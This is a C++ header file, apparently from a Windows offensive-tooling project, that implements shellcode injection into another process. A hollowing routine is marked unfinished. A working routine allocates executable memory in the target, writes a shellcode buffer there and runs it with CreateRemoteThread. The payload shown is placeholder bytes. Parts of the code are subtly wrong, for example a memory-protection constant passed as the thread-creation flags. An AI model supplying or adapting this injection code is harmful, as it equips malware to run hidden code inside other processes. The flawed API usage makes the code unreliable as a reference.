#pragma once
#include <Windows.h>
#include <psapi.h>
#include "Internals.h"

unsigned char shellcode[] =
{
  0x41, 0x41, 0x41, 0x41
};

BOOL InjectShellcodeByHollowing(PROCESS_INFORMATION processInfo)
{

	_tprintf(TEXT("This is still a WIP"));
	return FALSE;

	HMODULE hNTDLL = LoadLibraryA("ntdll");
	if (!hNTDLL)
	{
		return FALSE;
	}

	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL,"NtQueryInformationProcess");

	if (!fpNtQueryInformationProcess)
	{
		return 0;
	}

	_NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	PROCESS_BASIC_INFORMATION* processBasicInfo = new PROCESS_BASIC_INFORMATION();
	DWORD returnLength;
	ntQueryInformationProcess(processInfo.hProcess, 0, processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

	/*	if (!ntQueryInformationProcess(processInfo.hProcess, 0, processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &returnLength))
		{
			DisplayErrorMessage(TEXT("Error querying process information"), GetLastError());
			getchar();
			return FALSE;
		}
		*/
#ifdef DEBUG
	_tprintf(TEXT("Attach debugger..."));
	getchar();
#endif
	PVOID pRemoteImage = VirtualAllocEx (processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!pRemoteImage)
	{
		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(processInfo.hProcess, (LPVOID)processBasicInfo->PebBaseAddress, shellcode, sizeof(shellcode), nullptr))
	{
		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
		return FALSE;
	}
	return TRUE;
}


BOOL InjectShellcodeIntoNewThread(PROCESS_INFORMATION processInfo)
{

#ifdef DEBUG
	_tprintf(TEXT("Attach debugger..."));
	getchar();
#endif

	const PVOID memoryAddress = VirtualAllocEx(processInfo.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!memoryAddress)
	{
		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(processInfo.hProcess, memoryAddress, shellcode, sizeof(shellcode), nullptr))
	{
		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
		return FALSE;
	}

	if (!CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)memoryAddress, nullptr, PAGE_EXECUTE_READWRITE, nullptr))
	{
		DisplayErrorMessage(TEXT("Error creating thread"), GetLastError());
		return FALSE;
	}
	return TRUE;
}